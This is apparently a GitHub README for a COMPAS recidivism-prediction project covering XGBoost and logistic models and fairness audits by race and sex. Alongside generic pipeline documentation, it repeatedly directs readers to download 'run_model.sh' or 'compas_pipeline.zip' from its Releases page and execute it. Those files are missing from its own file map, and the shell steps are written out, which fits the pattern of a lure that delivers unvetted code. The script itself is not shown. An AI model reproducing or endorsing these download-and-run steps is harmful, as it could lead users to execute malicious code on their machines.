# COMPAS Recidivism Prediction: XGBoost, Logistic & Fairness

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/default78688/compas-recidivism-prediction/releases)  https://github.com/default78688/compas-recidivism-prediction/releases

![Criminal Justice Data](https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Justice_scales.svg/800px-Justice_scales.svg.png)

A compact, reproducible pipeline for binary recidivism prediction on the COMPAS dataset. This repo shows how to build, evaluate, and audit models with an emphasis on fairness and reproducibility. It contains data processing, baseline models, advanced models (XGBoost), and scripts for experiments and reporting.

Badges
- [![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)]()
- [![XGBoost](https://img.shields.io/badge/XGBoost-1.0-orange?logo=xgboost)]()
- [![License](https://img.shields.io/badge/License-MIT-green)]()
- Topics: binary-classification • compas • criminal-justice • fairness • imbalanced-data • feature-engineering

Quick download
[![Get Releases](https://img.shields.io/badge/Get%20Releases-%E2%86%92-blue?logo=github)](https://github.com/default78688/compas-recidivism-prediction/releases)

Table of contents
- What this repo contains
- Key features
- Data and ethics
- Quick start
- Full setup and usage
- Model training and evaluation
- Fairness analysis
- Handling imbalance
- Experiments and results
- File map
- Contributing
- License
- Releases

What this repo contains
- Cleaned COMPAS CSV ready to use.
- Feature engineering pipeline (scikit-learn transformers).
- Baseline models: logistic regression, decision tree.
- Advanced model: XGBoost with hyperparameter tuning.
- Evaluation notebooks for metrics and fairness audits.
- Scripts to run experiments and produce reproducible reports.
- Dockerfile and conda environment for reproducible runs.

Key features
- Reproducible pipeline with clear entry points.
- Balanced focus on accuracy and fairness.
- Tools for group-wise metrics and disparate impact checks.
- Support for imbalanced data: class weights, SMOTE, and focal loss.
- Lightweight experiments to compare models and features.

Data and ethics
The core dataset is COMPAS. The repo includes a cleaned version used for experiments. Use this dataset responsibly. The code shows how to evaluate fairness across protected groups like race and sex. The work aims to illustrate common trade-offs. It does not replace legal advice or domain expertise.

Quick start (run a demo)
1. Clone the repo
   git clone https://github.com/default78688/compas-recidivism-prediction.git
2. Create conda env
   conda env create -f environment.yml
   conda activate compas-recid
3. Run demo script
   python scripts/run_demo.py --model xgb

Releases (download and execute)
Visit the release assets to get prebuilt scripts and packaged models:
https://github.com/default78688/compas-recidivism-prediction/releases

Download the release asset named run_model.sh or compas_pipeline.zip and execute it on a Unix-like shell. The release contains preprocessed data and a trained XGBoost model. Example:
- Download compas_pipeline.zip from the Releases page.
- Unzip and run:
  unzip compas_pipeline.zip
  chmod +x run_model.sh
  ./run_model.sh

Full setup and usage

1) Install
- Option A: conda (recommended)
  conda env create -f environment.yml
  conda activate compas-recid
- Option B: pip
  python -m venv venv
  source venv/bin/activate
  pip install -r requirements.txt

2) Data
- raw/ contains original COMPAS files (or a pointer).
- data/ contains cleaned CSV used by the pipeline.
- scripts/clean_data.py shows preprocessing steps.

3) Run training
- Train logistic baseline:
  python train.py --model logistic --data data/compas_clean.csv --out results/logistic
- Train XGBoost (with CV):
  python train.py --model xgboost --data data/compas_clean.csv --out results/xgb --cv 5

4) Evaluate
- Run evaluation and produce a report:
  python evaluate.py --pred results/xgb/pred.csv --labels data/compas_clean.csv --out reports/xgb_report.html

Model training and evaluation

Pipeline overview
- Impute missing values with SimpleImputer.
- Encode categorical features with OneHotEncoder or target encoding.
- Scale numeric features where needed.
- Fit model with cross-validation and logging.
- Save model and preprocessing pipeline as a single artifact.

Baseline: Logistic regression
- Use L2 regularization and class weights.
- Interpret coefficients for feature importance.
- Good for a transparent baseline.

Advanced: XGBoost
- Tree-based model for higher accuracy.
- Use early stopping and eval sets.
- Tune max_depth, learning_rate, n_estimators, and scale_pos_weight.
- Save booster and feature map for SHAP.

Evaluation metrics
- Standard: accuracy, precision, recall, F1, ROC AUC, PR AUC.
- Threshold-based: precision@k, recall@k.
- Group metrics: TPR, FPR, predictive parity, calibration by group.
- Use bootstrapped CIs for stable estimates.

Fairness analysis

Protected attributes
- The pipeline includes switches to treat race, sex, and age as protected attributes.
- You can pass a list: --protected race,sex

Checks implemented
- Statistical parity difference
- Equal opportunity (TPR gap)
- Predictive parity (PPV gap)
- Calibration curves by group
- Disparate impact ratio

Mitigation strategies
- Preprocessing: reweighing, disparate impact remover.
- In-processing: adversarial debiasing, class-weight adjustments.
- Post-processing: threshold adjustment per group, calibrated equalized odds.

Example fairness command
python evaluate_fairness.py --pred results/xgb/pred.csv --labels data/compas_clean.csv --protected race --out reports/fairness.json

Handling imbalance

Common patterns
- Many recidivism datasets show class imbalance. The repo includes:
  - Class weight in logistic and XGBoost scale_pos_weight.
  - Resampling: SMOTE, RandomUnderSampler, Combined.
  - Ensemble balancing: balanced bagging.

Best practice
- Use stratified CV.
- Monitor PR-AUC along with ROC-AUC.
- Log class distribution at each stage.

Feature engineering

Core features
- Age at charge, priors_count, charge_degree, sex, race.
- Derived features: age_bin, priors_log, charge_category.

Categorical handling
- Use target encoding for high-cardinality fields.
- Use OneHot for low-cardinality categorical fields.

Temporal features
- If you have timestamps, add time-since-last-charge and cohort windows.

Explainability and interpretation
- Use SHAP to explain XGBoost predictions.
- Use coefficient plots for logistic regression.
- Produce feature importance and partial dependence plots.

Reproducible experiments
- Use the run_experiment.sh script. It saves:
  - git commit hash
  - full conda env
  - random seeds
  - model artifact, metrics, and plots

Logging and tracking
- Lightweight MLflow tracking is optional (see scripts/mlflow_setup.sh).
- Results and artifacts live under results/ and reports/.

Experiments and expected results
- Baseline logistic: ROC AUC ~ 0.68-0.72 depending on features.
- XGBoost: ROC AUC ~ 0.72-0.77 with tuned hyperparameters.
- Fairness: Equalizing TPR often reduces overall accuracy.
- Use the notebooks in notebooks/ to reproduce reported plots.

File map

- README.md — this file
- data/
  - compas_clean.csv — cleaned dataset
  - README.md — data notes and provenance
- notebooks/
  - eda.ipynb — exploratory analysis
  - training_and_fairness.ipynb — full pipeline demo
- scripts/
  - clean_data.py
  - train.py
  - evaluate.py
  - evaluate_fairness.py
  - run_demo.py
- models/ — saved model artifacts
- results/ — prediction outputs and metrics
- reports/ — HTML and JSON reports
- environment.yml — conda environment
- requirements.txt — pip requirements
- Dockerfile — optional container for runs

Contributing
- Fork the repo.
- Create a feature branch.
- Write tests for new features.
- Open a pull request with a clear description and reproducible steps.
- Use the issue tracker for bugs and feature requests.

License
- MIT License. See LICENSE for details.

Contact and support
- File issues on GitHub for bugs or feature requests.
- For reproducibility questions, attach a minimal script or notebook that reproduces the issue.

Releases (again)
Download the release assets and run the bundled script:
https://github.com/default78688/compas-recidivism-prediction/releases

If the release page lists run_model.sh or compas_pipeline.zip, download that file and execute it as shown earlier. If the assets differ, check the Releases section on GitHub for instructions and the correct filename.

Images and badges used
- Justice scales: Wikimedia Commons (public domain)
- Shields: img.shields.io

Examples

Run full pipeline locally (example)
- Create env
  conda env create -f environment.yml
  conda activate compas-recid
- Run full pipeline
  ./scripts/run_full_pipeline.sh --data data/compas_clean.csv --out experiments/exp1

Run only fairness checks
  python scripts/evaluate_fairness.py --pred results/xgb/pred.csv --labels data/compas_clean.csv --protected race,sex

Common troubleshooting
- If dependency error occurs, recreate the conda env.
- If data path fails, ensure data/compas_clean.csv exists.
- If plotting fails, check that matplotlib and seaborn are in the env.

Acknowledgements
- COMPAS dataset and prior studies provide context and validation cases.
- Tools: scikit-learn, xgboost, shap, imbalanced-learn.

This README aims to help you reproduce experiments, run audits, and adapt the pipeline to other recidivism or risk-assessment tasks.